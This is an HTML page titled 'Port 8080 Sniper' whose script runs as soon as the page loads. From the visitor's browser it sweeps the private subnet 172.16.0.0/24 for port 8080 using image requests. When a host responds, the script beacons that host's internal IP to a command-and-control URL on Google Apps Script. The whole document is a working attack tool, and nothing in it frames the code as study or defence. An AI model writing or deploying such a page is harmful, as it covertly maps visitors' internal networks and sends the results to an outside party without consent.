<!DOCTYPE html>
<html>
<head>
    <title>Port 8080 Sniper</title>
    <style>
        body { background-color: #111; color: #fff; font-family: monospace; padding: 20px; }
        .success { color: #00ff00; font-weight: bold; font-size: 1.5em; border: 1px solid #00ff00; padding: 10px; margin-top:10px;}
        .scanning { color: #888; }
    </style>
</head>
<body>
    <h1>// TARGETING PORT 8080 //</h1>
    <div id="status">Initializing...</div>
    <div id="results"></div>

    <script>
        // --- CONFIGURATION ---
        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
        
        var subnet = '172.16.0';
        var targetPort = 8080; 
        
        // We stop scanning as soon as we find it
        var found = false;
        var pendingProbes = 0;

        function reportSuccess(ip) {
            if(found) return; // Already reported
            found = true;

            var msg = "TARGET CONFIRMED: " + ip;
            document.getElementById('results').innerHTML = "<div class='success'>" + msg + "</div>";
            document.getElementById('status').innerText = "SCAN COMPLETE.";

            // Beacon the finding to C2
            fetch(C2_URL, {
                method: "POST",
                mode: "no-cors",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    status: "TARGET_ACQUIRED",
                    ip: ip,
                    port: targetPort
                })
            });
        }

        function probe(ip) {
            pendingProbes++;
            var img = new Image();
            
            // IF IT RESPONDS AT ALL (Load or Error), IT'S ALIVE
            var onResponse = function() {
                // We found the service!
                reportSuccess(ip);
                pendingProbes--;
            };

            img.onload = onResponse;
            img.onerror = onResponse; // <--- This will trigger because "Chrome controller running" is not a valid image

            // If it times out, it's not our guy
            setTimeout(function() {
                img.src = ""; // Kill request
                pendingProbes--;
            }, 1500);

            // Fire!
            img.src = "http://" + ip + ":" + targetPort + "/favicon.ico?r=" + Math.random();
        }

        // --- LAUNCH ---
        document.getElementById('status').innerText = "Sweeping " + subnet + ".0/24 for Port " + targetPort + "...";
        
        for (var i = 1; i < 255; i++) {
            probe(subnet + '.' + i);
        }

    </script>
</body>
</html>
